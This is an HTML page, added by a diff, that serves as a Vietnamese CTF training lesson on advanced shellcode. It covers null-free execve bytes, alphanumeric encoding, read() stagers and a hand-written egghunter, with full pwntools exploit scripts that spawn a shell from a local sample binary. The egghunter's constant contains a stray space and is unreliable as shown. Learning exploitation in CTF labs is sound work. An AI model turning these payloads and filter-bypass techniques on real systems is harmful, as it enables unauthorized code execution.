@@ -1,0 +1,485 @@
+<title>Shellcode nâng cao</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.scbox{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.scbox textarea{width:100%;font-family:var(--font-mono);font-size:13px;padding:8px;border:1px solid var(--line);border-radius:6px;background:var(--surface);color:var(--fg);min-height:54px}
+.scbox .out{margin-top:10px;padding:8px 12px;border-radius:8px;background:var(--surface);border:1px solid var(--line);word-break:break-all}
+.scbox .bad{color:var(--danger);font-weight:700}
+.scbox .good{color:var(--ok);font-weight:700}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 5 · Shellcode</div>
+    <h1>Shellcode nâng cao</h1>
+    <p class="sub">Khi shellcode "chuẩn" không chui lọt: input <strong>lọc byte</strong> (chỉ nhận chữ-số, cấm null), <strong>không gian chật</strong> (chỉ vài byte), hay địa chỉ không biết trước. Bài này: shellcode <mark>null-free</mark>, <mark>alphanumeric</mark>, <strong>egghunter</strong>, và <strong>stager</strong> — với byte thật và cách pwntools tự sinh.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao (Phase 5)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 RWX</span>
+      <span class="chip"><b>Cần trước:</b> <a href="ret2shellcode.html" style="color:inherit">shellcode cơ bản</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~60 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Ràng buộc</a><a href="#s4">04 Kỹ thuật</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Vấn đề:</strong> shellcode execve 23 byte không phải lúc nào cũng chui lọt. Input có thể cấm <code>\x00</code>, chỉ nhận <code>[A-Za-z0-9]</code>, giới hạn dài, hoặc bạn không biết đặt nó ở đâu.</p>
+    <p><strong>Lời giải:</strong> (1) <em>null-free</em> — tránh byte 0; (2) <em>alphanumeric</em> — chỉ dùng opcode là chữ/số; (3) <em>egghunter</em> — shellcode nhỏ đi tìm shellcode lớn trong bộ nhớ; (4) <em>stager</em> — shellcode mồi <code>read()</code> thêm shellcode thật.</p>
+    <p><strong>Thực chiến:</strong> <code>pwntools</code> sinh được (<code>shellcraft</code>, <code>encoders</code>); nhưng phải HIỂU ràng buộc để chọn đúng kỹ thuật.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>Biết input lọc gì → chọn null-free / alnum / egghunter / stager tương ứng.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Xác định ràng buộc</span>
+<pre><code># input lọc gì? test: gửi \x00, ký tự &gt;0x7f, in-ra-echo
+# không gian bao nhiêu byte? vùng chạy RWX ở đâu?</code></pre></div>
+      <div class="combat-row"><span class="lab">🚫 Null-free execve (22B)</span>
+<pre><code>context.arch='amd64'
+asm(shellcraft.sh())  # pwntools mặc định ĐÃ null-free</code></pre></div>
+      <div class="combat-row"><span class="lab">🔤 Alphanumeric</span>
+<pre><code>sc = asm(shellcraft.sh())
+enc = pwnlib.encoders.encoder.alphanumeric(sc)  # chỉ [A-Za-z0-9]</code></pre></div>
+      <div class="combat-row"><span class="lab">🥚 Egghunter (không gian nhỏ)</span>
+        <p>Đặt "egg" (vd <code>0x90909090</code> 2 lần) + shellcode thật ở nơi khác; shellcode nhỏ quét bộ nhớ tìm egg rồi nhảy tới.</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Nhớ</span>
+        <p>jmp rsp / jmp rax để nhảy vào buffer. Stager = read(0,buf,0x100) rồi jmp buf. Luôn <code>context.arch</code> đúng. Test byte cấm TRƯỚC.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Shellcode = byte opcode chạy được</h2>
+  <p>Shellcode cơ bản (<a href="ret2shellcode.html">bài trước</a>) giả định: input nhận <em>mọi</em> byte, có đủ chỗ (23+ byte), và bạn biết đặt nó ở đâu. Thực tế đề khó phá cả ba giả định. <span class="mem-term">Shellcode nâng cao</span> là tập kỹ thuật để shellcode vẫn chạy khi input bị lọc byte, chật chội, hoặc vị trí bất định. Mỗi kỹ thuật giải một ràng buộc cụ thể.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">null-free</div><p>Không chứa byte <code>\x00</code>.</p></div>
+    <div class="card"><div class="term">alphanumeric</div><p>Chỉ byte là [A-Za-z0-9].</p></div>
+    <div class="card"><div class="term">egghunter</div><p>SC nhỏ quét bộ nhớ tìm SC lớn.</p></div>
+    <div class="card"><div class="term">stager</div><p>SC mồi read() nạp SC thật.</p></div>
+    <div class="card"><div class="term">encoder</div><p>Biến SC thành byte hợp lệ + decoder.</p></div>
+    <div class="card"><div class="term">egg</div><p>Chuỗi đánh dấu (vd 8 byte) để tìm.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Ràng buộc buộc phải khéo</h2>
+  <p>Hàm nhập liệu thường vô tình (hoặc cố ý) lọc byte: <code>scanf("%s")</code> dừng ở whitespace (0x09,0x0a,0x20...); <code>fgets</code>/strcpy dừng ở null; hàm "chỉ nhận tên hợp lệ" ép <code>isalnum</code>. Shellcode execve bình thường chứa <code>0x0f05</code> (syscall), <code>0x3b</code>, byte cao — toàn thứ bị cấm. Lại có đề chỉ cho <strong>vài byte</strong> ghi vào (overflow ngắn) → không nhét nổi 23 byte. Hoặc shellcode nằm ở vùng heap/mmap <strong>không biết địa chỉ</strong>. Mỗi tình huống cần một mẹo riêng — đây là bộ công cụ.</p>
+ </div>
+</section>
+
+<!-- 03 Ràng buộc -->
+<section class="block" id="s3">
+ <div class="wrap wide">
+  <div class="secnum">03 / RÀNG BUỘC · MỤC LÕI</div>
+  <h2>Bản đồ: ràng buộc → kỹ thuật</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Input lọc / giới hạn</th><th>Kỹ thuật</th><th>Vì sao</th></tr></thead>
+    <tbody>
+      <tr><td>Cấm <code>\x00</code></td><td>null-free SC</td><td>shellcraft đã null-free sẵn</td></tr>
+      <tr><td>Chỉ <code>[A-Za-z0-9]</code></td><td>alphanumeric encoder</td><td>mọi byte phải là chữ/số</td></tr>
+      <tr><td>Cấm whitespace (scanf %s)</td><td>tránh 0x09/0x0a/0x20</td><td>%s dừng ở các byte đó</td></tr>
+      <tr><td>Không gian &lt; 23 byte</td><td>stager / egghunter</td><td>SC nhỏ nạp/tìm SC lớn</td></tr>
+      <tr><td>Không biết địa chỉ SC</td><td>egghunter / jmp rsp</td><td>quét bộ nhớ / nhảy tương đối</td></tr>
+      <tr><td>Byte cao bị đổi (toupper)</td><td>SC toàn chữ hoa hoặc tránh</td><td>toupper phá opcode thường</td></tr>
+    </tbody>
+  </table></div>
+  <h3>Shellcode execve null-free (byte thật)</h3>
+  <pre><code><span class="c"># asm(shellcraft.amd64.linux.sh()) — pwntools, ĐÃ null-free, 22 byte:</span>
+6a 68              <span class="c">push 0x68</span>
+48 b8 2f 62 69 6e 2f 2f 2f 73   <span class="c">mov rax,'/bin///s'</span>
+50                 <span class="c">push rax</span>
+48 89 e7           <span class="c">mov rdi,rsp</span>       <span class="c"># rdi → "/bin//sh"</span>
+68 72 69 01 01     <span class="c">push 0x1016972</span>  <span class="c"># mẹo tránh null: XOR-fix</span>
+...                <span class="c"># không có byte 00 nào</span>
+<span class="c"># so với exec shellcode "ngây thơ" chứa b0 3b / 0f05 + nhiều 00</span></code></pre>
+  <div class="note tip"><span class="tag">Mẹo null-free</span>Thay <code>mov rax,0</code> (chứa null) bằng <code>xor rax,rax</code>. Thay <code>mov al,0x3b</code> thay <code>mov rax,0x3b</code>. pwntools <code>shellcraft</code> tự áp các mẹo này → output null-free sẵn.</div>
+ </div>
+</section>
+
+<!-- 04 Kỹ thuật -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / CÁC KỸ THUẬT</div>
+  <h2>4 mẹo lõi</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Null-free (tránh \x00)</h4>
+    <p>Dùng xor thay mov-0, push-pop thay mov-hằng lớn. shellcraft tự làm.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Alphanumeric (chỉ chữ-số)</h4>
+    <p>Encoder: SC thật được mã hoá thành chuỗi [A-Za-z0-9], kèm một <em>decoder stub</em> (cũng alnum) tự giải mã khi chạy. pwntools <code>encoders.alphanumeric</code>.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Egghunter (vị trí bất định)</h4>
+    <p>SC nhỏ (~30 byte) quét toàn bộ không gian địa chỉ tìm "egg" (8 byte đánh dấu), khi thấy thì nhảy tới SC thật ngay sau egg. Dùng <code>access()</code>/sigaction để tránh SIGSEGV khi quét trang chưa map.</p></div></div>
+  <div class="step"><div class="n">4</div><div class="body"><h4>Stager (không gian nhỏ)</h4>
+    <p>SC mồi chỉ gọi <code>read(0, buf, 0x200)</code> rồi <code>jmp buf</code> — nạp SC thật qua stdin. Lọt vào khe chật, SC thật to tùy ý.</p></div></div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Byte checker: shellcode qua được lọc nào?</h2>
+  <p>Dán chuỗi hex (vd <code>6a3b</code>) → công cụ báo có null/whitespace/non-alnum không → gợi ý kỹ thuật.</p>
+  <div class="lab">
+    <div class="scbox" id="sc">
+      <textarea id="hexIn">6a68 48b82f62696e2f2f2f73 50 4889e7</textarea>
+      <div class="out" id="scOut"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Lọc, không gian, RWX</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Input lọc byte nào?</h4>
+    <pre><code><span class="c"># đọc hàm nhập: scanf %s? isalnum? strcpy? giới hạn len?</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Không gian &amp; RWX</h4>
+    <pre><code><span class="p">$</span> checksec; vmmap   <span class="c"># vùng rwx, kích thước buffer</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Cách nhảy vào SC</h4>
+    <pre><code><span class="c"># jmp rsp (0x...) / call rax / địa chỉ buffer cố định?</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>Alnum + Stager + Egghunter (số thật)</h2>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · alphanumeric</button>
+    <button class="tab" data-t="b">B · stager</button>
+    <button class="tab" data-t="c">C · egghunter</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — input chỉ nhận [A-Za-z0-9]. Mã hoá SC bằng alnum encoder.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+
+sc  = asm(shellcraft.sh())                 <span class="c"># SC thật (có byte không-alnum)</span>
+enc = pwnlib.encoders.encoder.alphanumeric(sc)  <span class="c"># → decoder-stub + data, TOÀN alnum</span>
+assert <span class="k">all</span>(<span class="d">0x30</span>&lt;=b&lt;=<span class="d">0x7a</span> <span class="k">for</span> b <span class="k">in</span> enc)    <span class="c"># chắc chắn alnum</span>
+
+<span class="c"># SC chạy ở buffer RWX; nhảy vào bằng jmp rsp (nằm trong binary)</span>
+JMP_RSP = <span class="d">0x401050</span>                        <span class="c"># gadget jmp rsp (số thật binary mẫu)</span>
+OFF = <span class="d">72</span>
+p.sendlineafter(b<span class="s">"&gt;"</span>, b<span class="s">"A"</span>*OFF + p64(JMP_RSP) + enc)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span><code>alphanumeric(sc)</code> trả về decoder-stub (bản thân toàn chữ-số) + data mã hoá; khi chạy, stub tự giải SC gốc ngay tại chỗ rồi chạy. <code>JMP_RSP=0x401050</code>, OFF=72 là của binary mẫu. Encoder cần vài thanh ghi "sạch" — đọc doc nếu lỗi.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b">
+<pre><code><span class="c"># BẢN B — khe chật (vd chỉ 40 byte). Dùng stager read() nạp SC thật.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+
+BUF = <span class="d">0x404600</span>                             <span class="c"># vùng RWX ghi được (bss map rwx)</span>
+<span class="c"># stager: read(0, BUF, 0x400); jmp BUF  — chỉ ~25 byte</span>
+stager = shellcraft.read(<span class="d">0</span>, BUF, <span class="d">0x400</span>)
+stager += <span class="s">"mov rax, %d\n jmp rax"</span> % BUF
+stg = asm(stager)
+log.info(<span class="s">f"stager {len(stg)} byte"</span>)
+
+JMP_RSP = <span class="d">0x401050</span>; OFF = <span class="d">72</span>
+p.sendlineafter(b<span class="s">"&gt;"</span>, b<span class="s">"A"</span>*OFF + p64(JMP_RSP) + stg)
+<span class="c"># giờ stager chờ đọc SC thật từ stdin:</span>
+p.send(asm(shellcraft.sh()))               <span class="c"># SC thật, dài tùy ý</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Stager</span>Ý tưởng: khe nhỏ chỉ nhét vừa stager đọc thêm. BUF phải RWX (bss nếu binary map rwx, hoặc stack). jmp BUF nhảy vào SC vừa đọc. Hai giai đoạn gửi.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c">
+<pre><code><span class="c"># BẢN C — không biết SC thật ở đâu (heap/mmap ngẫu nhiên). Egghunter.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+
+<span class="c"># egg = 8 byte đánh dấu đặt NGAY TRƯỚC SC thật</span>
+egg = b<span class="s">"P4WNEGG!"</span>
+hunter = <span class="s">'''</span>
+<span class="s">  /* quét 0x1000-aligned, access() để không segfault */</span>
+<span class="s">  xor rbx, rbx</span>
+<span class="s">next_page: or bx, 0xfff        /* rbx |= 0xfff */</span>
+<span class="s">next_addr: inc rbx</span>
+<span class="s">  /* access(rbx, 0): rax=21 */</span>
+<span class="s">  lea rdi, [rbx]</span>
+<span class="s">  push 21; pop rax; syscall</span>
+<span class="s">  cmp al, 0xf2               /* EFAULT? trang chưa map → nhảy trang */</span>
+<span class="s">  jz next_page</span>
+<span class="s">  mov rax, 0x21474745 4e573450  /* "P4WNEGG!" little-endian */</span>
+<span class="s">  cmp [rbx], rax; jnz next_addr</span>
+<span class="s">  cmp [rbx+8], rax; jnz next_addr  /* egg lặp 2 lần cho chắc */</span>
+<span class="s">  jmp rbx                    /* thấy egg → nhảy tới SC ngay sau */</span>
+<span class="s">'''</span>
+p.sendlineafter(b<span class="s">"hunter&gt;"</span>, asm(hunter))
+p.sendlineafter(b<span class="s">"payload&gt;"</span>, egg + egg + asm(shellcraft.sh()))  <span class="c"># egg×2 + SC</span>
+p.interactive()</code></pre>
+<div class="note"><span class="tag">Egghunter</span>Hunter nhỏ quét từng trang; <code>access(addr,0)</code> trả EFAULT (−14, al=0xf2) nếu trang chưa map → bỏ qua, tránh crash. Thấy egg lặp 2 lần → nhảy vào SC. Kinh điển của Skape (2004).</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>SC chứa byte cấm</h4><p>Test trước: null/whitespace/non-alnum. Chọn encoder đúng.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Không nhảy được vào SC</h4><p>Cần jmp rsp/rax hoặc địa chỉ cố định. vmmap tìm RWX.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Egghunter crash</h4><p>Thiếu access() chống segfault khi quét. Thêm syscall 21.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">shellcraft</div><h4>SC null-free</h4><p>sh/cat/read ráp sẵn.</p></div>
+    <div class="card"><div class="term">encoders.alphanumeric</div><h4>alnum</h4><p>Mã hoá + decoder stub.</p></div>
+    <div class="card"><div class="term">msfvenom</div><h4>encoder khác</h4><p>x86/alpha_mixed...</p></div>
+    <div class="card"><div class="term">pwntools asm()</div><h4>Dịch</h4><p>asm → opcode theo arch.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi SC không chạy</h2>
+  <div class="grid">
+    <div class="card"><h4>SC bị cắt</h4><p>Input dừng ở null/whitespace. Dùng null-free/tránh byte.</p></div>
+    <div class="card"><h4>SIGILL</h4><p>Opcode hỏng do encoder/toupper. Kiểm byte sau lọc.</p></div>
+    <div class="card"><h4>SIGSEGV ngay</h4><p>Vùng không RWX (NX). mprotect hoặc vùng khác.</p></div>
+    <div class="card"><h4>Egghunter treo</h4><p>Egg chưa đặt / sai endian. In egg bytes kiểm.</p></div>
+    <div class="card"><h4>Stager không đọc</h4><p>read fd/size sai. fd=0 stdin, size đủ lớn.</p></div>
+    <div class="card"><h4>alnum encoder lỗi</h4><p>Thiếu thanh ghi sạch / địa chỉ. Đọc doc encoder.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Chọn kỹ thuật theo lọc</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Tình huống</th><th>Giải pháp</th></tr></thead>
+    <tbody>
+      <tr><td>printable ASCII only</td><td>alphanumeric/alpha_mixed encoder</td></tr>
+      <tr><td>toupper (→ chữ hoa)</td><td>SC toàn uppercase-safe opcode</td></tr>
+      <tr><td>khe &lt; 30 byte</td><td>stager read() 2-giai-đoạn</td></tr>
+      <tr><td>SC ở mmap/heap bất định</td><td>egghunter quét bộ nhớ</td></tr>
+      <tr><td>NX (không RWX)</td><td><a href="ret2syscall_mprotect.html">mprotect</a> tạo RWX rồi jmp</td></tr>
+      <tr><td>seccomp cấm execve</td><td><a href="seccomp_orw.html">ORW shellcode</a></td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Kiến trúc</span>x86 (32-bit): egghunter/encoder có biến thể riêng (access qua int 0x80 nr 33). ARM: opcode khác hoàn toàn, pwntools vẫn sinh được. Nguyên lý ràng-buộc→kỹ-thuật giống nhau.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · null-free</div><p>Input cấm \x00. shellcraft.sh() chạy thẳng.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · alphanumeric</div><p>Chỉ [A-Za-z0-9]. Encoder + jmp rsp.</p></div>
